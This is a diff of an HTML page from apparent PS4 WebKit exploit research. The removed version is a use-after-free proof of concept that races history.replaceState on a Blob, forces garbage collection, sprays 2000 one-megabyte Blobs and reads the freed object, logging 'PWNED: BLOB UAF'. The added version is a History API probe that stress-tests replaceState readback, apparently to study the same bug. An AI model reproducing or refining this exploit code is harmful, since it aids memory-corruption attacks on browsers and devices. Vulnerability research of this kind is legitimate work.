@@ -1,180 +1,213 @@
 <!DOCTYPE html>
-<html>
+<html lang="pt-BR">
 <head>
-<meta charset="UTF-8">
-<title>PS4</title>
+<meta charset="UTF-8" />
+<title>PS4 WebKit - History Write-Stuck Sanity (V2.2)</title>
+<style>
+  body { background:#000; color:#0f0; font-family: monospace; }
+  button { padding:10px 14px; margin:6px 6px 6px 0; font-size:14px; }
+  #log { white-space:pre-wrap; border:1px solid #0f0; padding:10px; margin-top:10px; }
+  .ok{color:#0f0} .warn{color:#ff0} .bad{color:#f66} .dim{color:#8f8}
+</style>
 </head>
 <body>
+<h2>History API Sanity – Write Acceptance / Setup Stickiness (V2.2)</h2>
 
-<h1>PS4</h1>
-<p>Strategy: Target BlobDataHandle (External Memory UAF)</p>
-<div id="log" style="font-family:monospace; background:#eee; padding:10px; border:1px solid #000; height: 400px; overflow-y: scroll;"></div>
-<button onclick="runExploit()" style="font-size:20px; padding:20px; background:indigo; color:white; font-weight:bold;">DEPLOY BLOBS</button>
+<div>
+  <button onclick="resetAndShow()">Reset (BASE/A + BASE/B)</button>
+  <button onclick="runAcceptanceProbe()">Run Acceptance Probe (replaceState loop)</button>
+  <button onclick="runRecoveryProbe()">Run Setup Recovery Probe (apply BASE)</button>
+  <button onclick="clearLog()">Limpar</button>
+</div>
+
+<div style="margin-top:8px">
+  <label>Max i:
+    <input id="maxI" type="number" value="80" min="1" step="1">
+  </label>
+  <label style="margin-left:10px">Readback steps:
+    <select id="rbMode">
+      <option value="immediate">immediate</option>
+      <option value="microtask">microtask</option>
+      <option value="raf">raf</option>
+      <option value="all" selected>all (immediate+microtask+raf)</option>
+    </select>
+  </label>
+  <label style="margin-left:10px">
+    <input id="gc" type="checkbox"> GC pressure leve
+  </label>
+</div>
+
+<div id="log"></div>
 
 <script>
-    var L = document.getElementById('log');
-    function log(m) { 
-        var d = document.createElement('div');
-        d.innerHTML = m;
-        L.appendChild(d);
-        L.scrollTop = L.scrollHeight;
+const $ = (id)=>document.getElementById(id);
+const logEl = $("log");
+
+function now(){ return (performance.now()).toFixed(2); }
+function L(msg, cls="dim"){
+  const line = `[${now()}] ${msg}\n`;
+  if(cls==="ok") logEl.innerHTML += `<span class="ok">${escapeHtml(line)}</span>`;
+  else if(cls==="warn") logEl.innerHTML += `<span class="warn">${escapeHtml(line)}</span>`;
+  else if(cls==="bad") logEl.innerHTML += `<span class="bad">${escapeHtml(line)}</span>`;
+  else logEl.innerHTML += `<span class="dim">${escapeHtml(line)}</span>`;
+  logEl.scrollTop = logEl.scrollHeight;
+}
+function escapeHtml(s){
+  return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
+}
+function clearLog(){ logEl.textContent=""; }
+
+function safeStateSummary(st){
+  if(!st) return "null";
+  try{
+    // resumo curto e estável
+    const o = {};
+    if ("kind" in st) o.kind = st.kind;
+    if ("entry" in st) o.entry = st.entry;
+    if ("id" in st) o.id = st.id;
+    if ("stamp" in st) o.stamp = st.stamp;
+    if ("marker" in st) o.marker = st.marker;
+    return JSON.stringify(o);
+  }catch(e){
+    return "[unserializable]";
+  }
+}
+
+function tick(){ return new Promise(r=>setTimeout(r,0)); }
+function micro(){ return Promise.resolve(); }
+function raf(){ return new Promise(r=>requestAnimationFrame(()=>r())); }
+
+function makeState(kind, extra){
+  // objeto NOVO sempre (evita “mesma referência”)
+  const st = Object.assign({ kind, stamp: Date.now() }, extra||{});
+  return st;
+}
+
+function isExpectedB(){
+  const st = history.state;
+  return (location.hash === "#B" && st && st.kind==="BASE" && st.entry==="B");
+}
+
+async function resetAllVerified(retries=3){
+  for(let k=1;k<=retries;k++){
+    history.replaceState(makeState("BASE",{entry:"A"}), "", "#A");
+    history.pushState(makeState("BASE",{entry:"B"}), "", "#B");
+    await tick();
+
+    const ok = isExpectedB();
+    L(`[SETUP] attempt=${k} href=${location.href}`, ok?"ok":"bad");
+    L(`[SETUP] history.length=${history.length}`, ok?"ok":"bad");
+    L(`[SETUP] state=${safeStateSummary(history.state)}`, ok?"ok":"bad");
+
+    if(ok){
+      L(`[SETUP] OK: BASE/B aplicado e hash #B.`, "ok");
+      return true;
+    }
+    L(`[SETUP] FAIL: setup não “grudou”. Possível engine desync/no-op.`, "bad");
+    await tick();
+  }
+  L(`[FATAL] ENGINE DESYNC: setup write failed após retries.`, "bad");
+  L(`[ACTION] Recarregue a página manualmente (reload) e rode novamente.`, "warn");
+  return false;
+}
+
+async function resetAndShow(){
+  await resetAllVerified(3);
+}
+
+function gcPressureLight(){
+  // leve e curto (não quer DoS)
+  const a = [];
+  for(let i=0;i<200;i++){
+    a.push(new Uint8Array(0x2000));
+  }
+  return a;
+}
+
+async function readbackCheck(expectId, mode){
+  // retorna {ok, gotId, phase}
+  const phases = (mode==="all") ? ["immediate","microtask","raf"] : [mode];
+  for(const ph of phases){
+    if(ph==="microtask") await micro();
+    if(ph==="raf") await raf();
+
+    const st = history.state;
+    const got = (st && typeof st==="object" && "id" in st) ? st.id : undefined;
+    if(got === expectId){
+      return { ok:true, gotId: got, phase: ph };
+    }
+  }
+  // último observado:
+  const st = history.state;
+  const got = (st && typeof st==="object" && "id" in st) ? st.id : undefined;
+  return { ok:false, gotId: got, phase: phases[phases.length-1] };
+}
+
+async function runAcceptanceProbe(){
+  clearLog();
+  const maxI = Math.max(1, parseInt($("maxI").value||"80",10));
+  const rbMode = $("rbMode").value;
+  const doGC = $("gc").checked;
+
+  L(`===== ACCEPTANCE PROBE =====`, "ok");
+  const okSetup = await resetAllVerified(3);
+  if(!okSetup) return;
+
+  let firstFail = null;
+  let lastOk = null;
+
+  for(let i=1;i<=maxI;i++){
+    const st = makeState("BURST",{ id:i, marker:`M${i}`, payload:"X".repeat(64) });
+    history.replaceState(st, "", "#B"); // mantém hash, só troca state
+    if(doGC && (i % 10 === 0)) gcPressureLight();
+
+    const rb = await readbackCheck(i, rbMode);
+
+    if(!rb.ok){
+      if(firstFail === null){
+        firstFail = { i, got: rb.gotId, phase: rb.phase };
+        L(`[FAIL] i=${i} readback got=${rb.gotId} (phase=${rb.phase})`, "bad");
+        L(`[STATE] history.state=${safeStateSummary(history.state)}`, "bad");
+        // mais uma tentativa imediata para confirmar persistência
+        await tick();
+        const rb2 = await readbackCheck(i, "immediate");
+        L(`[CONFIRM] immediate recheck ok=${rb2.ok} got=${rb2.gotId}`, rb2.ok?"warn":"bad");
+      } else {
+        // depois do primeiro fail, só amostra
+        if(i % 5 === 0) L(`[after-fail] i=${i} got=${rb.gotId}`, "warn");
+      }
+    } else {
+      lastOk = i;
+      if(i % 10 === 0) L(`[OK] i=${i} (phase=${rb.phase})`, "ok");
     }
 
-    function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+    // se entrou em fail, não precisa ir até o fim — mas deixo rodar até maxI se você quiser.
+    if(firstFail && i - firstFail.i >= 8) break;
+  }
 
-    // 1MB Blobs (Recurso Caro)
-    const BLOB_SIZE = 1024 * 1024; 
-    
-    function createBlobContent(char) {
-        try {
-            var buf = new Uint8Array(BLOB_SIZE);
-            buf.fill(char.charCodeAt(0));
-            return buf;
-        } catch(e) { return null; }
-    }
+  L(`----- SUMMARY -----`, "ok");
+  L(`lastOk=${lastOk} firstFail=${firstFail ? JSON.stringify(firstFail) : "none"}`, firstFail?"warn":"ok");
 
-    var sprayStore = [];
+  // Agora testa se o setup ainda "gruda" depois do colapso:
+  L(`----- POST-COLLAPSE SETUP CHECK -----`, "warn");
+  const okSetup2 = await resetAllVerified(3);
+  L(`postCollapseSetupOK=${okSetup2}`, okSetup2?"ok":"bad");
+}
 
-    // SPRAY DE BLOBS ("B")
-    async function sprayBlobs() {
-        log("[*] Injetando Spray de Blobs 'B'...");
-        var content = createBlobContent("B");
-        if (!content) return;
+async function runRecoveryProbe(){
+  clearLog();
+  L(`===== SETUP RECOVERY PROBE =====`, "ok");
 
-        // Cria 2000 Blobs (2GB virtuais)
-        // O sistema tentará reutilizar slots de blobs liberados
-        for(var i=0; i<2000; i++) {
-            if (i % 200 === 0) await sleep(2);
-            try {
-                // Cria o Blob
-                var b = new Blob([content], { type: "application/octet-stream" });
-                sprayStore.push(b);
-            } catch(e) { break; }
-        }
-    }
+  // tenta várias vezes, sem rodar burst.
+  for(let t=1;t<=6;t++){
+    const ok = await resetAllVerified(3);
+    L(`[RECOVERY] trial=${t} ok=${ok}`, ok?"ok":"bad");
+    if(!ok) break;
+    await tick();
+  }
 
-    // PRESSURE (Mistura de Arrays e MessageChannels)
-    async function aggressiveCleanup() {
-        log("[*] Forçando limpeza de Blobs órfãos...");
-        
-        // 1. ArrayBuffer Churn
-        var trash = [];
-        for(var i=0; i<500; i++) trash.push(new ArrayBuffer(1024 * 1024));
-        trash = null;
-        await sleep(50);
-
-        // 2. MessageChannel Churn (Trigger GC callback)
-        for(var i=0; i<2000; i++) {
-            var mc = new MessageChannel();
-        }
-        await sleep(50);
-    }
-
-    // Leitor seguro de Blob
-    function readBlob(blob) {
-        return new Promise((resolve) => {
-            var fr = new FileReader();
-            fr.onload = () => resolve(fr.result); // Retorna ArrayBuffer ou String
-            fr.onerror = () => resolve(null);
-            fr.readAsText(blob);
-        });
-    }
-
-    const BURST_SIZE = 400;
-
-    function runExploit() {
-        log("<b>[*] Inicializando V84...</b>");
-        sprayStore = [];
-        
-        // 1. Setup
-        for(var i=0; i<15; i++) history.pushState({id: i}, "s"+i);
-
-        window.onpopstate = async function(e) {
-            log("[!] Race iniciada...");
-            await sleep(10);
-
-            // Payload Vítima: Blob "A"
-            var bufA = createBlobContent("A");
-            var blobA = new Blob([bufA], { type: "text/plain" });
-
-            // 2. Race Trigger (Burst)
-            for(var i=0; i < BURST_SIZE; i++) {
-                if (i % 50 === 0) await sleep(1);
-                // Alterna estrutura para forçar realocação
-                var p = (i % 2 == 0) ? { b: blobA } : blobA;
-                history.replaceState(p, "", "?q="+i);
-            }
-            
-            // 3. Drop
-            log("[*] Soltando referências...");
-            history.replaceState(null, "CLEAN");
-            blobA = null; // Mata referência local
-            bufA = null;
-            
-            // 4. SEQUENCE
-            setTimeout(async function() {
-                
-                // Tenta 3 vezes
-                for(var attempt=1; attempt<=3; attempt++) {
-                    log("<b>[!!!] TENTATIVA " + attempt + " [!!!]</b>");
-                    
-                    // A. Limpeza
-                    sprayStore = []; // Solta spray anterior
-                    await aggressiveCleanup();
-                    
-                    // B. Spray
-                    await sprayBlobs();
-                    
-                    // C. Check
-                    try {
-                        var z = history.state;
-                        
-                        if (z) {
-                            var targetBlob = null;
-                            if (z instanceof Blob) targetBlob = z;
-                            else if (z.b instanceof Blob) targetBlob = z.b;
-                            
-                            if (targetBlob) {
-                                log("[?] Lendo Zumbi (Async)...");
-                                var txt = await readBlob(targetBlob);
-                                
-                                if (txt && txt.length > 0) {
-                                    var sample = txt.substring(0, 50);
-                                    
-                                    if (sample.indexOf("B") !== -1) {
-                                        log("<h1 style='color:red; background:yellow'>[!!!] PWNED: BLOB UAF [!!!]</h1>");
-                                        log("Conteúdo 'B' lido no Blob 'A'!");
-                                        return;
-                                    } else if (sample.indexOf("A") !== -1) {
-                                        log("[-] Conteúdo 'A'. Blob imortal.");
-                                    } else {
-                                        log("<h1 style='color:red; background:yellow'>[?] CORRUPTION [?]</h1>");
-                                        log("Lixo: " + sample);
-                                    }
-                                } else {
-                                    log("[-] Leitura vazia.");
-                                }
-                            } else {
-                                log("[-] Objeto não é Blob: " + z);
-                            }
-                        } else {
-                            log("[-] State nulo.");
-                        }
-                    } catch(err) {
-                        log("Erro: " + err);
-                    }
-                    
-                    await sleep(500);
-                }
-                
-                log("[-] Fim das tentativas.");
-
-            }, 100);
-        };
-
-        history.go(-5);
-    }
+  L(`(Se isso falhar SEM burst, então há algo externo interferindo.)`, "dim");
+}
 </script>
 </body>
-
 </html>
